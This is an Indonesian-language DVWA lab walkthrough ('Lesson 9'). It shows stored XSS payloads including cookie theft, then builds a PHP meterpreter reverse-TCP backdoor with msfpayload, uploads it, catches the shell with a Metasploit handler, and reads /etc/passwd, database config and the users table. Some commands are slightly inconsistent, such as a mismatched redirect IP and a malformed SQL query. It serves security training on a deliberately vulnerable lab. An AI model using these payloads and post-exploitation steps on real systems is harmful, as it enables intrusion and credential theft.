# DVWA | Lesson 9
## Konfigurasi

###{ Upload PHP Backdoor Payload }

pada lesson 9, kami menggunakan metasploid dan backtrack.

- pertama-tama agar backtrack dan metasploit mendapat IP, buka vm -> klik kanan -> setting -> network -> pilih bridge adapter

![alt text](./backtrack.PNG)
![alt text](./metasploit.PNG)

Alamat target DVWA (metasploitable) 
`http://10.151.34.170`

Alamat penyerang (backtrack)
`http://10.151.34.160`


## Skenario

- start metasploit dan backtrack yang sudah dikonfigurasi
- masuk ke folder :
    `/var/www/dvwa/vulnerabilities/xss_s`
![alt text](./1.PNG)
- edit file index.php
    `nano index.php`
![alt text](./2.PNG)
- carilah kata mtxMessages
- caranya dengan ctrl+w, masukan keyword mtxMessages
![alt text](./3.PNG)
- ganti maxlength menjadi 250
![alt text](./4.PNG)
- buka preference pada bactrack
![alt text](./5.PNG)
- klik content
- uncheck block pop up windows
- klik close
![alt text](./6.PNG)
- login dvwa pada firefox backtrack
- buka 10.151.34.170/dvwa/login.php
![alt text](./7.PNG)
- seting dvwa security low
- klik submit
![alt text](./8.PNG)
- buka halaman xss stored
- masukkan script :
    `<script>alert("tesss")</script>`
- klik submit
![alt text](./9.PNG)
- berhasil
![alt text](./10.PNG)
- masuk ke halaman setup
- klik create database
![alt text](./11.PNG)
- masuk ke halaman xss stored
![alt text](./12.PNG)
 - masukkan message 
    `<iframe src = "www.its.ac.id"></iframe>`
![alt text](./13.PNG)
- berhasil
![alt text](./14.PNG)
- kembali masuk ke setup
- create database
![alt text](./15.PNG)
- masuk ke halaman xss stored
- masukkan script 
    `<script>alert(document.cookie)</script>`
![alt text](./16.PNG)
- berhasil
![alt text](./17.PNG)
- buka terminal
- masukkan command berikut :

    `mkdir -p /root/backdoor`

    `cd /root/backdoor`
    
    `msfpayload php/meterpreter/reverse_tcp` 
    
    `LHOST=10.151.34.160 LPORT=4444 R > FORUM_BUG.php`
    
    `ls -l FORUM_BUG.php`

![alt text](./18.PNG)
- buka nano FORUM_BUG.php
- hapus tanda # yang ada
- simpan dengan ctr+x
![alt text](./19.PNG)
- upload file FORUM_BUG.php
![alt text](./20.PNG)
- buka terminal
- buka msfconsole
![alt text](./21.PNG)

    `use exploit/multi/handler`

   `set PAYLOAD php/meterpreter/reverse_tcp`
    
    `set LHOST 10.151.34.160`
    
    `set LPORT 4444`
    
    `exploit`

![alt text](./22.PNG)
- masuk ke dvwa pada backtrack firefox
- masuk ke halaman setup
![alt text](./23.PNG)
- ketik script :    `<script>window.location="http://192.168.1.106/dvwa/hackable/uploads/FORUM_BUG.php" </script>`
![alt text](./24.PNG)
- hasil
![alt text](./25.PNG)
- koneksi sudah stabil
![alt text](./26.PNG)
- melakukan shell
![alt text](./27.PNG)
- whoami 
    dilakukan untuk menampilkan nama user, disini ada www-data
- grep apache /etc/passwd      
- find /var/www/* -print | grep config
       
![alt text](./28.PNG)
- grep "db_" /var/www/dvwa/config/config.inc.php
- echo "use dvwa; show tables;" | mysql -uroot 
- echo "use dvwa; desc users;" | mysql -uroot 
- echo "select user, from dvwa.users;" | mysql -uroot
![alt text](./29.PNG)
![alt text](./30.PNG)
![alt text](./31.PNG)





## Hasil
kita bisa mengcrack password 
![alt text](./32.PNG)